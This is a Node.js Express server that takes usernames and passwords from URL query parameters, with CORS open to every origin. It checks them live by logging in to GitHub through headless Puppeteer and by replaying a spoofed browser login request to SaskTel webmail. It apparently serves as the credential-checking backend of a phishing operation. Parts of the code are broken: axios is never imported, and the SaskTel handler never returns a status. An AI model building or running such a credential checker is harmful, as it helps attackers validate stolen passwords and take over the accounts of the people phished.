const puppeteer = require('puppeteer');
const cors = require('cors');
const express = require("express");
const app = express();
const PORT = 4000;

const corsOptions = {
    origin: true, // Allow all origins
};
const renderCloudConfig = {
  args: ['--no-sandbox', '--disable-setuid-sandbox'],
};
app.use(cors(corsOptions));
// Utility function to handle common tasks related to logging in
const login = async (page, username, password) => {
  // Navigate to the login page
  await page.goto('https://github.com/login');

  // Fill in the form fields
await page.type('#login_field', [username]);
await page.type('#password', [password]);

  // Click the submit button
  await Promise.all([
    page.waitForNavigation(),
    page.click('input.js-sign-in-button'),
  ]);
};

app.get("/submit", async (req, res) => {
  // Get parameters from GET request
  const { username, password } = req.query;

  // Launch a headless instance of Puppeteer
  const browser = await puppeteer.launch(renderCloudConfig);
  
  // Open a new tab
  const page = await browser.newPage();

  try {
    // Attempt to log in using provided credentials
    await login(page, username, password);

    // Check if flash-error class exists on the page
    if ((await page.$x("/html/body/div[1]/div[3]/main/div/div[2]/div")).length > 0) {
      return res.status(200).send("false");
    } else {
      return res.status(200).send("true");
    }
  } catch (err) {
    console.error(err);
    return res.status(200).json("internal");
  } finally {
    await browser.close();
  }
});
app.get("/ok", async (req, res) => {
  return res.status(200).send("ok")
});
const bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({ extended: false }));

const sendLoginRequest = async ({ username, password }) => {
  const config = {
    method: "post",
    url: "https://webmail.sasktel.net/api/bf/login/",
    headers: {
      Accept: "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language":
        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6,de;q=0.5",
      Adrum: "isAjax:true",
      Connection: "keep-alive",
      "Content-Type": "application/json;charset=UTF-8",
      Host: "webmail.sasktel.net",
      Origin: "https://webmail.sasktel.net",
      Referer: "https://webmail.sasktel.net/",
      "Sec-Ch-Ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": "\"Windows\"",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    },
    data: {
      SnapInfo: {
        SnapEmailField: null,
        SnapPassField: null,
        SnapUrl: null,
        SnapOn: "NO",
        SnapShortEmailOn: null,
        SnapRemoteAuth: "YES",
      },
      user: username,
      password: password,
    },
  };

  try {
    const response = await axios.request(config);
    console.log(`Response received:\n${JSON.stringify(response.data)}`);
  } catch (error) {
    console.error(`An error occurred while sending the request: ${error}`);
  }
};

app.get("/sasktel", async (req, res) => {
  const { username, password } = req.query;
  
  if (!username || !password) {
    return res.status(400).send("Username and Password must be specified.");
  }

  try {
    const statusCode = await sendLoginRequest({ username, password });
    res.status(statusCode).send(`Status Code: ${statusCode}`);
  } catch (error) {
    res.status(500).send("An unexpected error occurred.");
  }
});

app.listen(PORT, () => {
  console.log(`Server started`);
});
